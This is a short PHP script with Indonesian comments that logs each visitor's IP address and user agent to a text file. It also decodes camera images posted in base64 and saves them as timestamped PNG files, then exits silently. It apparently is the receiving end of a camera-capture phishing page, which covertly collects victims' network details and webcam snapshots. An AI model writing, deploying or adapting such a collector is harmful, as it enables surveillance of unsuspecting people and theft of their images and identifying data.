<?php
// Simpan IP & User-Agent
$ipaddress = $_SERVER['REMOTE_ADDR'] . "\r\n";
$useragent = "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
file_put_contents('ip.txt', "IP: ".$ipaddress.$useragent, FILE_APPEND);

// Simpan snapshot kamera
if (!empty($_POST['cam_image'])) {
    $date = date('dMYHis');
    $imageData = $_POST['cam_image'];
    $filteredData = substr($imageData, strpos($imageData,",")+1);
    $unencodedData = base64_decode($filteredData);
    file_put_contents('cam'.$date.'.png', $unencodedData);
}
exit();
?>
